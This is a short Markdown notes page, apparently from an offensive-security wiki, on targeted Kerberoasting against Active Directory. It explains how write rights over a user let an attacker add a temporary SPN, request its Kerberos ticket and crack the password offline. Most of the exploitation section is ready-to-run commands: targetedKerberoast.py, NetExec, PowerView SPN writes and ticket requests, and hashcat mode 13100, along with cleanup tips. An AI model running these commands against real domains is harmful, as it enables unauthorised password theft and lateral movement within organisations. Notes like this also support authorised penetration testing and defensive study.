**Targeted Kerberoasting** — with `GenericAll`/`GenericWrite` over a user account that has no SPN, write a temporary SPN to it, request and crack its service ticket ([Kerberoasting](../Kerberos%20Attacks/Kerberoasting.md)), then remove the SPN. Turns a write-ACE into that user's cleartext password (if crackable).

## Discovery

Any BloodHound `GenericWrite`/`GenericAll` edge to a **user** object (not a computer) that does not already have a `servicePrincipalName`. Confirm the ACE - see [_Intro to ACL Attacks](_Intro%20to%20ACL%20Attacks.md).

## Exploitation

### One-shot (targetedKerberoast.py)

Adds a fake SPN, roasts, and removes the SPN automatically for every user you can write:

```bash

targetedKerberoast.py -v -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' --dc-host 'DC_HOST'

```

```bash

# NetExec equivalent
nxc ldap 'DC_HOST' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' --kerberoasting out.txt

```

### Manual (Windows, PowerView)

```powershell

# 1) write a temporary SPN
Set-DomainObject -Identity 'TARGET_USER' -Set @{serviceprincipalname='fake/WHATEVER'}
# 2) request the ticket
Get-DomainUser -Identity 'TARGET_USER' | Get-DomainSPNTicket | fl
# 3) remove the SPN
Set-DomainObject -Identity 'TARGET_USER' -Clear serviceprincipalname

```

Crack the `$krb5tgs$` hash offline - see [Windows Password Cracking](../Credential%20Dumping/Windows%20Password%20Cracking.md) (`hashcat -m 13100`).

## Caution

If the tool fails mid-run it may leave the fake SPN behind - verify `serviceprincipalname` is cleared on the target (`Get-DomainUser TARGET_USER -Properties serviceprincipalname`). Roastable only if the account's password is weak.

## References

- The Hacker Recipes - Targeted Kerberoasting - https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting
- targetedKerberoast - https://github.com/ShutdownRepo/targetedKerberoast
- The Hacker Recipes - Kerberoast - https://www.thehacker.recipes/ad/movement/kerberos/kerberoast
